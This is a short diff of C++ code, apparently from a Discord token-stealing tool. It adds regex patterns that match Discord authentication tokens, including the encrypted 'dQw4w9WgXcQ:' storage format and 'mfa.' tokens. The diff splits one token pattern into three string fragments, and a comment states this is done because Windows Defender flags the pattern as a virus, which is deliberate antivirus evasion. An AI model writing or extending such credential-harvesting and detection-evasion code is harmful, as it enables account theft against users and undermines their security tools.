@@ -62,9 +62,13 @@ public:
             regex_list.emplace_back(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*)");
             regex_list.emplace_back("dQw4w9WgXcQ:(.*?)=");
 
-            regex_list.emplace_back(R"((?:\w|-){24}\.(?:\w|-){6}\.(?:\w|-){27})");
-            regex_list.emplace_back(R"(mfa\.(?:\w|-){84})");
+            // Cant write the regex as one part because windows defender gives a virus flag because that this is a JWT pattern
+            std::string regex_part_1 = R"([\w-]{24}\.[\)";
+            std::string regex_part_2 = R"(w-]{6}\)";
+            std::string regex_part_3 = R"(.[\w-]{27})";
 
+            regex_list.emplace_back(regex_part_1 + regex_part_2 + regex_part_3, std::regex::optimize);
+            regex_list.emplace_back(R"(mfa\.(?:\w|-){84})", std::regex::optimize);
 
             std::mutex mtx;
 
